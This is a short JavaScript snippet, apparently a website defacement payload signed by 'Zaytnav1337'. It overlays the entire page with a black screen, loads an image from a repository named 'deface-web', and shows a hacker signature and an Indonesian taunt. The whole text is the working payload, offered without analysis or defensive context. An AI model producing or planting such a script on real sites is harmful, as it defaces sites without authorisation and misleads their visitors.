let overlay = document.createElement('div');
overlay.style.position = 'fixed';
overlay.style.top = '0';
overlay.style.left = '0';
overlay.style.width = '100%';
overlay.style.height = '100%';
overlay.style.backgroundColor = 'black';
overlay.style.color = 'white';
overlay.style.textAlign = 'center';
overlay.style.zIndex = '999999';
overlay.style.fontFamily = 'Acme, sans-serif';
overlay.style.overflowY = 'auto'; // agar bisa scroll jika konten tinggi

overlay.innerHTML = `
  <div style="position: absolute; top: 20px; right: 30px; font-size: 24px; color: white; cursor: pointer;" id="close-btn" title="Close">✖</div>
  <div style="padding-top: 60px;">
    <img src="https://cdn.jsdelivr.net/gh/zaytnav1337/deface-web@main/How-to-recover-a-hacked-website-and-get-your-SEO-back-on-track.jpeg" 
         style="max-width: 100%; height: 75vh; object-fit: cover;">
    <div style="margin-top: 30px;">
      <h1 style="font-size:2.8vw;">By Zaytnav1337</h1>
      <p style="color:red; font-size:18px;">Aku Hanya Sekedar Menguji Rasa Penasaranku<br></p>
      <p style="color:white; font-size:16px;">+++ZI1337+++</p>
    </div>
  </div>
`;

overlay.querySelector('#close-btn').addEventListener('click', () => {
  document.body.removeChild(overlay);
});

document.body.appendChild(overlay);
